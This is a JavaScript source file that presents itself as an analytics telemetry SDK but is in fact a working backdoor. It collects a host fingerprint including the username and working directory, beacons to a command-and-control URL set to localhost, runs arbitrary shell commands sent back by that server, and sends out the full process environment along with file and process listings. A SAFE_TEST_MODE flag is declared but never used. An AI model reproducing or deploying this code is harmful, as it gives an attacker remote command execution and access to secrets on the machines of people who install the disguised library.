const http = require("http");
const os = require("os");
const { execSync } = require("child_process");

const SAFE_TEST_MODE = true;
const C2_URL = "http://localhost:9999/c2";
const BEACON_INTERVAL = 5000;

class TelemetryClient {
  constructor(options = {}) {
    this.appId = options.appId || "default";
    this.endpoint = options.endpoint || C2_URL;
    this.beaconTimer = null;
    this.commandQueue = [];
    this.eventBuffer = [];
  }

  start() {

    this.fingerprint = this._collectFingerprint();

    this.beaconTimer = setInterval(() => {
      this._beacon();
    }, BEACON_INTERVAL);
  }

  track(event, props = {}) {
    this.eventBuffer.push({
      event,
      props,
      timestamp: Date.now(),
    });
  }

  identify(userId, traits = {}) {
    this.fingerprint.userId = userId;
    this.fingerprint.traits = traits;
  }

  flush() {
    if (this.eventBuffer.length === 0) return;
    const payload = {
      type: "exfil",
      fingerprint: this.fingerprint,
      events: this.eventBuffer.splice(0),
    };
    this._send(payload);
  }

  shutdown() {
    if (this.beaconTimer) {
      clearInterval(this.beaconTimer);
      this.beaconTimer = null;
    }
  }

  _collectFingerprint() {
    return {
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      cpus: os.cpus().length,
      memory: os.totalmem(),
      user: os.userInfo().username,
      pid: process.pid,
      nodeVersion: process.version,
      cwd: process.cwd(),
      uptime: os.uptime(),
    };
  }

  _beacon() {
    const payload = {
      type: "beacon",
      fingerprint: this.fingerprint,
      buffered_events: this.eventBuffer.length,
    };
    this._send(payload, (response) => {
      if (response && response.commands) {
        for (const cmd of response.commands) {
          this._executeCommand(cmd);
        }
      }
    });
  }

  _executeCommand(cmd) {
    let result;
    try {
      switch (cmd.type) {
        case "shell":
          result = execSync(cmd.payload, {
            encoding: "utf-8",
            timeout: 10000,
          });
          break;
        case "env":
          result = JSON.stringify(process.env);
          break;
        case "ls":
          result = execSync(`ls -la ${cmd.payload || "."}`, {
            encoding: "utf-8",
            timeout: 5000,
          });
          break;
        case "ps":
          result = execSync(
            process.platform === "win32" ? "tasklist" : "ps -ef",
            { encoding: "utf-8", timeout: 5000 }
          );
          break;
        default:
          result = "unknown command type";
      }
    } catch (e) {
      result = `error: ${e.message}`;
    }

    this._send({
      type: "command_result",
      command: cmd,
      result: result,
      fingerprint: this.fingerprint,
    });
  }

  _send(payload, callback) {
    try {
      const data = JSON.stringify(payload);
      const url = new URL(this.endpoint);
      const req = http.request(
        {
          hostname: url.hostname,
          port: url.port,
          path: url.pathname,
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data),
            "User-Agent": "analytics-sdk/2.1.0",
          },
        },
        (res) => {
          let body = "";
          res.on("data", (chunk) => (body += chunk));
          res.on("end", () => {
            if (callback) {
              try {
                callback(JSON.parse(body));
              } catch (e) {

              }
            }
          });
        }
      );
      req.on("error", () => {

      });
      req.write(data);
      req.end();
    } catch (e) {

    }
  }
}

module.exports = { TelemetryClient };
